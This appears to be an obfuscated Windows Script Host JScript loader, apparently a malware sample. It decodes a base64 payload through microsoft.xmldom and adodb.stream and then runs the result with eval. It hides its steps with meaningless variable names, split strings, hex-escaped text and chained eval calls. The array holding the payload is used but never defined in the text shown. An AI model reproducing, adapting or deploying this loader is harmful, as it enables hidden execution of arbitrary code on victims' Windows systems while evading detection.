
for(var v=0; v<HerdyByz.length; v++){
	eval("HerdyByz[2] = HerdyByz[2].replace(new RegExp(HerdyByz[0][v], \"g\"), HerdyByz[1][v]);");
}
var ShwnMic = Array(["dataType", "bin.base64"], ["text", HerdyByz[2]]);
function CreateObj(WfedRatn){
	var obj = WSH;
	for(var i=0; i<WfedRatn.length; i++){
		obj = obj[WfedRatn[i][0]](WfedRatn[i][1]);
	}
	if(WfedRatn.length <= 2){
		return obj
	}else{
		eval("ShwnMic = [ShwnMic[1][0]];");
		return WfedRatn["nodeTypedValue"];
	}
}

var mxml = CreateObj([["CreateObject", "microsoft.xmldom"], [Array("cre","ate","Elem","ent").join(""), "jbl"]]);
for(var k=0; k<ShwnMic.length; k++){
	eval("mxml[ShwnMic[k][0]] = ShwnMic[k][1];");
}

var jatMide = CreateObj([["CreateObject", "adodb.stream"]]);

eval(["jatMide[\"Type\"] = 1;", 
					"jatMide[\"Open\"]();", 
					"jatMide[\"Write\"](CreateObj(mxml));", 
					"jatMide[\"Position\"] = 0;", 
					"jatMide[\"Type\"] = 2;",
					"jatMide[\"CharSet\"] = \"\x75\x73\x2D\x61\x73\x63\x69\x69\";jatMide = jatMide[\"ReadT\"+ShwnMic[0].substr(1)]();"
				].join(""));


eval(jatMide);